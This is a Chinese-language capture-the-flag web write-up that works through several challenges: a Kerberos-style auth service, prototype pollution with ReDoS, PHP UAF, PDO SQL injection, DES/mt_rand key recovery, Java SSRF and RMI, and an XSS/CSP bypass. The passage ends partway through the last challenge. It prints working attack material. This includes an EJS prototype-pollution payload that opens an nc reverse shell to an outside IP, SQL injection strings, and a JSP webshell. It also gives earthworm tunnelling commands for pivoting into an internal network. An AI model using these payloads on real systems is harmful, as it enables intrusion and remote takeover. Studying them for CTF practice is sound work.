<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">def TGT_vender():</span><br><span class="line">    username = request.form.get(&apos;username&apos;)</span><br><span class="line">    authenticator = request.form.get(&apos;authenticator&apos;)</span><br><span class="line">    user = User.query.filter_by(username=username).first()</span><br><span class="line">    if user != None:</span><br><span class="line">        cryptor = AESCipher(user.master_key)</span><br><span class="line">        try:</span><br><span class="line">            data = json.loads(cryptor.decrypt(base64.b64decode(authenticator)))</span><br><span class="line">            if data[&apos;username&apos;] == username:</span><br><span class="line">                if int(time.time()) - data[&apos;timestamp&apos;] &lt; 60:</span><br><span class="line">                    session_key = genSession_key()</span><br><span class="line">                    session_key_enc = base64.b64encode(cryptor.encrypt(session_key))</span><br><span class="line">                    cryptor = AESCipher(app.config.get(&apos;SECRET_KEY&apos;))</span><br><span class="line">                    TGT = base64.b64encode(cryptor.encrypt(username + &apos;|&apos; + session_key + &apos;|&apos; + str(int(time.time()))))</span><br><span class="line">                    return session_key_enc + &apos;|&apos; + TGT</span><br><span class="line">        except Exception:</span><br><span class="line">            return &apos;auth fail&apos;</span><br><span class="line">    return &quot;auth error&quot;</span><br></pre></td></tr></table></figure>
<p>KDC使用<code>master_key</code>解密发送过去的<code>authenticator</code>，并用<code>username</code>对客户端进行认证。然后使用<code>master_key</code>加密<code>session_key</code>，再用<code>SECRET_KEY</code>加密<code>username</code>、<code>session_key</code>、<code>timestamp</code>作为<code>TGT</code>，然后将<code>TGT</code>和<code>session_key_enc</code>发送回客户端。此时客户端可以用自己的<code>master_key</code>解密<code>session_key_enc</code>得到<code>session_key</code>，此后使用<code>session_key</code>来加密数据，<code>TGT</code>则作为认证</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">def Ticket_vender():</span><br><span class="line">    username = request.form.get(&apos;username&apos;)</span><br><span class="line">    authenticator = request.form.get(&apos;authenticator&apos;)</span><br><span class="line">    TGT = request.form.get(&apos;TGT&apos;)</span><br><span class="line">    cmd = request.form.get(&apos;cmd&apos;)</span><br><span class="line">    user = User.query.filter_by(username=username).first()</span><br><span class="line">    if user != None:</span><br><span class="line">        cryptor = AESCipher(app.config.get(&apos;SECRET_KEY&apos;))</span><br><span class="line">        auth_data = cryptor.decrypt(base64.b64decode(TGT)).split(&apos;|&apos;)</span><br><span class="line">        cryptor = AESCipher(auth_data[1])</span><br><span class="line">        try:</span><br><span class="line">            data = json.loads(cryptor.decrypt(base64.b64decode(authenticator)))</span><br><span class="line">            if data[&apos;username&apos;] == auth_data[0] == username:</span><br><span class="line">                if int(time.time()) - data[&apos;timestamp&apos;] &lt; 60:</span><br><span class="line">                    if cmd not in [&apos;whoami&apos;, &apos;ls&apos;]:</span><br><span class="line">                        return &apos;cmd error&apos;</span><br><span class="line">                session_key = genSession_key()</span><br><span class="line">                session_key_enc = base64.b64encode(cryptor.encrypt(session_key))</span><br><span class="line">                cryptor = AESCipher(auth_data[1])</span><br><span class="line">                client_message = base64.b64encode(cryptor.encrypt(session_key))</span><br><span class="line">                server = User.query.filter_by(username=&apos;cmd_server&apos;).first()</span><br><span class="line">                cryptor = AESCipher(server.master_key)</span><br><span class="line">                server_message = base64.b64encode(cryptor.encrypt(session_key + &apos;|&apos; + data[&apos;username&apos;] + &apos;|&apos; + cmd))</span><br><span class="line">                return client_message + &apos;|&apos; + server_message</span><br><span class="line">        except Exception:</span><br><span class="line">            return &apos; fail&apos;</span><br><span class="line">    return &quot;auth error&quot;</span><br></pre></td></tr></table></figure>
<p>服务器端会接收<code>username</code>、<code>authenticator</code>、<code>TGT</code>和<code>cmd</code>，然后用<code>SECRET_KEY</code>解密<code>TGT</code>得到<code>username</code>、<code>session_key</code>、<code>timestamp</code>，再用<code>session_key</code>解密<code>authenticator</code>，然后进行认证。最后将<code>cmd</code>发送到<code>cmd_server</code>执行</p>
<p>整个过程我们需要先获取本地生成的<code>master_key</code>，然后在访问KDC后获取<code>session_key_enc</code>、<code>TGT</code>，并使用<code>master_key</code>解密<code>session_key_enc</code>得到<code>session_key</code>。最后在<code>authenticator</code>中设置一个超时时间，再用<code>session_key</code>加密，然后带上其它数据发送给服务器端即可执行命令</p>
<h2 id="nweb"><a href="#nweb" class="headerlink" title="nweb"></a>nweb</h2><p>这题主要考的是渗透<br>截注册接口的包，将<code>type</code>修改为110注册账号，登录即可进入<code>flag.php</code><br><code>flag.php</code>处的搜索框可以盲注，双写绕过<code>select</code>和<code>from</code>过滤，能d得到flag的大部分<br>然后再通过盲注拿下admin的账号密码<code>admin whoamiadmin</code>，登录<code>admin.php</code>（通过扫目录可以扫到）<br>登入后可以扫描数据库，于是<code>rogue mysql server</code>一波读<code>flag.php</code>源码得到flag剩余部分</p>
<h2 id="GuessGame"><a href="#GuessGame" class="headerlink" title="GuessGame"></a>GuessGame</h2><p><code>/static/app.js</code>给了源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function log(userInfo) &#123;</span><br><span class="line">    let logItem = &#123; time: new Date().toString() &#125;;</span><br><span class="line">    merge(logItem, userInfo);</span><br><span class="line">    loginHistory.push(logItem);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先看到<code>log()</code>中使用了<code>merge()</code>，这里可以进行原型链污染，于是看哪里用到了<code>log()</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">app.post(&quot;/&quot;, function(req, res) &#123;</span><br><span class="line">    if (typeof req.body.user.username != &quot;string&quot;) &#123;</span><br><span class="line">        res.end(&quot;error&quot;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        if (config.forbidAdmin &amp;&amp; req.body.user.username.includes(&quot;admin&quot;)) &#123;</span><br><span class="line">            res.end(&quot;any admin user has been baned&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            if (</span><br><span class="line">                req.body.user.username.toUpperCase() === adminName.toUpperCase()</span><br><span class="line">            )</span><br><span class="line">                //only log admin&apos;s activity</span><br><span class="line">                log(req.body.user);</span><br><span class="line">            res.end(&quot;ok&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>在<code>/</code>处找到，又是<code>toUpperCase()</code>，用<code>ı</code>进行绕过即可。接着找要污染的地方</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">app.post(&quot;/verifyFlag&quot;, function(req, res) &#123;</span><br><span class="line">    //let result = &quot;Your match flag is here: &quot;;</span><br><span class="line">    let result = &quot;Emm~ I won&apos;t tell you what happened! &quot;;</span><br><span class="line"></span><br><span class="line">    if (typeof req.body.q != &quot;string&quot;) &#123;</span><br><span class="line">        res.end(&quot;please input your guessing flag&quot;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        let regExp = req.body.q;</span><br><span class="line">        if (config.enableReg &amp;&amp; noDos(regExp) &amp;&amp; flag.match(regExp)) &#123;</span><br><span class="line">            //res.end(flag);</span><br><span class="line">            //Stop your wishful thinking and go away!</span><br><span class="line">        &#125;</span><br><span class="line">        if (req.query.q === flag) result += flag;</span><br><span class="line">        res.end(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>看到<code>/verifyFlag</code>处，在判断<code>config.enableReg</code>，<code>noDos(regExp)</code>后对flag进行了正则匹配，虽然没回显但只有这个地方与flag有关。<br>于是找到<code>config</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var config = &#123;</span><br><span class="line">    forbidAdmin: true</span><br><span class="line">    // &quot;enableReg&quot; : true</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>发现<code>enableReg</code>被注释了，那应该就是要污染这里了</p>
<p>于是<br><code>{&quot;user&quot;:{&quot;username&quot;: &quot;admın666&quot;,&quot;__proto__&quot;: {&quot;enableReg&quot;: true}}}</code><br>污染之后就能通过<code>config.enableReg</code>的判断</p>
<p>但这里就算有否匹配成功结果都是一样的，实际上这里的<code>noDos()</code>在提示我们使用ReDOS攻击<br><a href="https://www.freebuf.com/column/200309.html" target="_blank" rel="noopener">ReDOS初探</a><br>ReDOS攻击简单来说就是通过构造正则表达式，使其无法迅速处理导致延时甚至DOS</p>
<p>这题可以用这个表达式<code>^(?=.{0}g)((.*)*)*!$</code>来一位一位跑出结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># coding: utf-8</span><br><span class="line"></span><br><span class="line">import re</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">s1 = time.time()</span><br><span class="line">regex = re.compile(&apos;^(?=g)((.*)*)*!$&apos;)</span><br><span class="line">str=&apos;g3tF1AaGEAzY&apos;        </span><br><span class="line">regex.match(str)</span><br><span class="line">s2=time.time()</span><br><span class="line">print(str)</span><br><span class="line">print(s2-s1)</span><br></pre></td></tr></table></figure>
<p>本地测试延时大概是2s，再套一个就跑不出来了<br>像<code>^(?=g)((.*)*)*!$</code>这样也可以</p>
<p>除了ReDOS，还可以直接利用<code>ejs-rce</code>，直接弹shell。由于这题使用的是alpine，不能直接bash弹shell，这里记一下V&amp;N大佬们的payload<br><code>{&quot;user&quot;:{&quot;username&quot;:&quot;admIn888&quot;,&quot;__proto__&quot;:{&quot;enableReg&quot;:True,&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;rm /tmp/fa;mkfifo /tmp/fa;cat /tmp/fa|/bin/sh -i 2&gt;&amp;1|nc 106.14.15.50 1234 &gt; /tmp/fa &#39;);var __tmp2&quot;}}}</code></p>
<h2 id="PHP-UAF"><a href="#PHP-UAF" class="headerlink" title="PHP-UAF"></a>PHP-UAF</h2><p>和GYCTF那个差不多，就是换了个脚本<br><code>phpinfo()</code>可以看到版本的7.4.2，一堆<code>disable_functions</code>，JSON UAF使用不了<br><a href="https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php" target="_blank" rel="noopener">exploits/php7-backtrace-bypass/exploit.php</a><br>但同个仓库下有新版本的能用，当时没细看血亏，改个命令就能用<br>可惜了清华大佬还想我们调试</p>
<h2 id="sqlcheckin"><a href="#sqlcheckin" class="headerlink" title="sqlcheckin"></a>sqlcheckin</h2><p>给了源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    // ...</span><br><span class="line">    $pdo = new PDO(&apos;mysql:host=localhost;dbname=sqlsql;charset=utf8;&apos;, &apos;xxx&apos;, &apos;xxx&apos;);</span><br><span class="line">    $pdo-&gt;setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);//设置查询数据返回的类型，这样不用每次都写fetchAll(PDO::FETCH_ASSOC)</span><br><span class="line">    $stmt = $pdo-&gt;prepare(&quot;SELECT username from users where username=&apos;$&#123;_POST[&apos;username&apos;]&#125;&apos; and password=&apos;$&#123;_POST[&apos;password&apos;]&#125;&apos;&quot;);</span><br><span class="line">    $stmt-&gt;execute();</span><br><span class="line">    $result = $stmt-&gt;fetchAll();</span><br><span class="line">    if (count($result) &gt; 0) &#123;</span><br><span class="line">        if ($result[0][&apos;username&apos;] == &apos;admin&apos;) &#123;</span><br><span class="line">            include(&apos;flag.php&apos;);</span><br><span class="line">            exit();</span><br><span class="line">    // ....</span><br></pre></td></tr></table></figure>
<p>标准的PDO预处理错误用法，真正的随便注<br>万能密码即可<br><code>username=admin&#39;--+&amp;password=</code></p>
<p>不过wp给出了一种挺有趣的绕过方式<br><code>username=admin&#39;and(1-&amp;password=)-&#39;</code><br>生成的语句是<br><code>SELECT username from users where username=&#39;admin&#39;and(1-&#39; and password=&#39;)-&#39;&#39;</code><br>通过单引包括的为字符串，int型减去字符型以开头的数字为准，这里就是<code>1-0-0</code>。于是最终的查询就是<br><code>SELECT username from users where username=&#39;admin&#39;and(1)</code></p>
<h2 id="nothardweb"><a href="#nothardweb" class="headerlink" title="nothardweb"></a>nothardweb</h2><p>分析源码，可以看到目标是要将username设置为admin</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    session_start();</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    include &quot;user.php&quot;;</span><br><span class="line">    include &quot;conn.php&quot;;</span><br><span class="line">    $IV = &quot;********&quot;;// you cant know that;</span><br><span class="line">    if(!isset($_COOKIE[&apos;user&apos;]) || !isset($_COOKIE[&apos;hash&apos;]))&#123;</span><br><span class="line">        if(!isset($_SESSION[&apos;key&apos;]))&#123;</span><br><span class="line">            $_SESSION[&apos;key&apos;] = strval(mt_rand() &amp; 0x5f5e0ff);</span><br><span class="line">            $_SESSION[&apos;iv&apos;] = $IV;</span><br><span class="line">        &#125;</span><br><span class="line">        $username = &quot;guest&quot;;</span><br><span class="line">        $o = new User($username);</span><br><span class="line">        echo $o-&gt;show();</span><br><span class="line">        $ser_user = serialize($o);</span><br><span class="line">        $cipher = openssl_encrypt($ser_user, &quot;des-cbc&quot;, $_SESSION[&apos;key&apos;], 0, $_SESSION[&apos;iv&apos;]);</span><br><span class="line">        setcookie(&quot;user&quot;, base64_encode($cipher), time()+3600);</span><br><span class="line">        setcookie(&quot;hash&quot;, md5($ser_user), time() + 3600);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        $user = base64_decode($_COOKIE[&apos;user&apos;]);</span><br><span class="line">        $uid = openssl_decrypt($user, &apos;des-cbc&apos;, $_SESSION[&apos;key&apos;], 0, $_SESSION[&apos;iv&apos;]);</span><br><span class="line">        if(md5($uid) !== $_COOKIE[&apos;hash&apos;])&#123;</span><br><span class="line">            die(&quot;no hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        $o = unserialize($uid);</span><br><span class="line">        echo $o-&gt;show();</span><br><span class="line">        if ($o-&gt;username === &quot;admin&quot;)&#123;</span><br><span class="line">            $_SESSION[&apos;name&apos;] = &apos;admin&apos;;</span><br><span class="line">            include &quot;hint.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这里是一个<code>des-cbc</code>加密，我们能够得到加密后的结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class User&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    function __construct($username)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">    &#125;</span><br><span class="line">    function show()&#123;</span><br><span class="line">        return &quot;username: $this-&gt;username\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>再通过<code>user.php</code>我们可以获得明文，由于没有给iv应该不是要CBC翻转，那就想办法去搞到key和iv了</p>
<p><code>$_SESSION[&#39;key&#39;] = strval(mt_rand() &amp; 0x5f5e0ff);</code></p>
<p>而key是通过<code>mt_rand()</code>与运算生成，之前在hgame也说过有除了爆破的方法去获得<code>mt_rand()</code>的种子<br><a href="https://www.anquanke.com/post/id/196831" target="_blank" rel="noopener">无需暴破还原mt_rand()种子</a><br>具体原理看链接，简而言之就是可以通过生成的随机数R0与R227，以及R0前生成的随机数个数，获得种子<br>脚本来源：<a href="https://github.com/ambionics/mt_rand-reverse" target="_blank" rel="noopener">mt_rand-reverse</a></p>
<p>测试一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mt_srand(164632);</span><br><span class="line">echo mt_rand();</span><br><span class="line">for($i=1;$i&lt;227;$i++)&#123;</span><br><span class="line">    mt_rand();</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo mt_rand();</span><br></pre></td></tr></table></figure>
<p>结果：<br>21822616<br>1260657684</p>
<p><img src="http://shifeng-kaze.cn/blog/GXZY_web_wp/8daac8b98a6d8c5e144a48d1d212ec1f.png" alt=""></p>
<p>而题目给了用户的uid表相差也是227，而且提示我们是229名用户</p>
<p><img src="http://shifeng-kaze.cn/blog/GXZY_web_wp/9e6c90288d2ad5430481d605dd749127.png" alt=""></p>
<p>uid可能是用户的key或者mt_seed()结果，都试一下就行了</p>
<p>这里除了这样，由于知道了明文和密文且iv不变，可以拿密文的第一段作为iv，然后去爆破密文第二段，解出为明文第二段则是key。然后再用key去解iv即可<br>还有一种做法是，由于没有检查<code>SESSIONID</code>是否存在，直接置为空，就没有key和iv，直接空加密即可</p>
<p>登录为admin后，<code>hint.php</code>中提示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">I left a shell in 10.10.1.12/index.php </span><br><span class="line">try to get it!</span><br></pre></td></tr></table></figure>
<p>而且可以看到<code>hint.php</code>的源码为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&apos;cc&apos;]))&#123; </span><br><span class="line">	$cc = $_GET[&apos;cc&apos;]; </span><br><span class="line">	eval(substr($cc, 0, 6)); </span><br><span class="line">&#125;else&#123;</span><br><span class="line">	highlight_file(__FILE__); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里是一个小trick，这里可以传入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cc=`$cc`;cmd</span><br></pre></td></tr></table></figure></p>
<p>截取后为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`$cc`;</span><br></pre></td></tr></table></figure></p>
<p>通过eval执行得到<code>$cc</code>的值，就能突破长度执行命令（但我本地并没测试成功，是环境的问题？）</p>
<p>之后wp上给的是用soap进行内网渗透，不过直接通过服务器shell用curl打过去把shell打回来不就行了？<br>打回shell会在根目录发现hint，又提示了另一台主机<code>10.10.2.13</code></p>
<p>这里可以利用earthworm进行流量转发，让我们能直接访问<code>10.10.2.13</code><br><a href="https://klionsec.github.io/2017/08/05/ew-tunnel/" target="_blank" rel="noopener">ew-tunnel</a><br>自己公网的服务器上<br><code>./ew_for_linux -s rcsocks -l 12345 -e 1234</code><br>内网的跳板机上<br><code>./ew_for_linux -s rssocks -d vps_ip -e 1234</code><br>然后主机上SOCKS代理设置为<code>vps_ip：12345</code>就可以直接访问到内网的<code>10.10.2.13</code><br>至于earthworm脚本去github上搜吧，怕被查水表</p>
<p>进去后是tomcat界面，是<code>CVE-2017-12615</code>的洞(好像又出了个2020的CVE)<br><a href="https://github.com/vulhub/vulhub/tree/master/tomcat/CVE-2017-12615" target="_blank" rel="noopener">CVE-2017-12615</a><br>可以通过PUT请求像服务器任意写文件<br>于是搞一个jsp的马，上传至<code>/1.jsp/</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span><br><span class="line">        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();</span><br><span class="line">        int a = -1;</span><br><span class="line">        byte[] b = new byte[2048];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a=in.read(b))!=-1)&#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
<p>然后<code>10.10.2.13/1.jsp?pwd=023&amp;i=cmd</code>来执行命令即可</p>
<h2 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h2><p>不知道原题干了啥，这里记录一下考点的东西</p>
<p>首先是java的SSRF</p>
<p><img src="http://shifeng-kaze.cn/blog/GXZY_web_wp/45bf8633e06e759fe9943acfb71c3fbf.png" alt=""></p>
<p>JAVA中可以使用netdoc协议，读取目录<br>像<code>netdoc:///var/www/html/</code>这样就可以读取到网站根目录的文件</p>
<p>第二个是高版本jdk攻击rmi registry<br>baby_java也说到了，高版本的jdk由于<code>trustURLCodebase</code>限制无法加载远程库。这里利用<code>Commons Collections 3.1</code>的漏洞（实际上baby_java也是，不过之前没注意到），可以绕过这个限制去加载远程库</p>
<p>具体分析看这里<br><a href="https://0day.design/2020/01/24/Apache-Commons-Collections-3.1%20反序列化漏洞分析/" target="_blank" rel="noopener">Java入坑：Apache-Commons-Collections-3.1 反序列化漏洞分析</a><br>不同版本的jdk最后的部分也不一样，用ysoserial生成exp即可</p>
<h2 id="happyvacation"><a href="#happyvacation" class="headerlink" title="happyvacation"></a>happyvacation</h2><p>这题没拿到源码，没想到XSS的题也是搞源码，有个.git泄露</p>
<p>CSP限制了只能为同源脚本，但允许内联js，同时交互处有上次文件的地方（不过我好像没看到），绕过方式就很明显了，通过上传脚本引入即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function __construct()&#123; </span><br><span class="line">    $this-&gt;black_list = [&apos;ph&apos;, &apos;ht&apos;, &apos;sh&apos;, &apos;pe&apos;, &apos;j&apos;]; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>虽然上传做了一些过滤，但通过script并不要求要js后缀，随便一个后缀都可以</p>
<p>绕CSP是个小问题，难搞的是<code>message</code>处的过滤</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if(isset($user))&#123;</span><br><span class="line">    if(isset($_GET[&apos;message&apos;]))&#123;</span><br><span class="line">        $user-&gt;leaveMessage($_GET[&apos;message&apos;]);</span><br><span class="line">    &#125;</span><br><span class="line">    $user-&gt;showMessage();</span><br><span class="line">    if($user-&gt;url-&gt;flag)&#123;</span><br><span class="line">        echo $user-&gt;asker-&gt;mes();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">class User&#123; </span><br><span class="line">    function leaveMessage($message)&#123; </span><br><span class="line">        $this-&gt;info-&gt;leaveMessage($message); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function showMessage()&#123; </span><br><span class="line">        echo &quot;&lt;body&gt;&lt;script&gt; var a = &apos;&#123;$this-&gt;info-&gt;message&#125;&apos;;document.write(a); &lt;/script&gt;&lt;/body&gt;&quot;; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Info&#123; </span><br><span class="line">    function leaveMessage($message)&#123; </span><br><span class="line">        if(preg_match(&quot;/cookie|&lt;|&gt;|win/i&quot;, $message, $ma))&#123; </span><br><span class="line">            $this-&gt;message = &quot;?&quot;; var_dump($ma); </span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $this-&gt;message = addslashes($message); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用了<code>addslashes()</code>对<code>message</code>进行了处理，这样就没办法直接用’或”绕出了。这里是第一次知道可以用宽字节来绕过，只要在头部设置<code>Content-Type: text/html; charset=GBK;</code>，就可以和sql一样<code>%df</code>绕过</p>
<p>于是寻找一下可以利用的地方</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function go()&#123; </span><br><span class="line">    if(isset($this-&gt;pre) and isset($this-&gt;after) and isset($this-&gt;location)) &#123; </span><br><span class="line">        $dest = $this-&gt;pre . $this-&gt;location . $this-&gt;after; </span><br><span class="line">        header($dest); </span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        header(&quot;Location: index.php&quot;); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>UrlHelper类中<code>go()</code>可以控制<code>header()</code>，但<code>pre</code>的值被定为<code>Location:</code>要想办法修改</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function __construct()&#123;</span><br><span class="line">    $this-&gt;pre = &quot;Location:&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>quit.php</code>处有个<code>answer</code>参数</p>
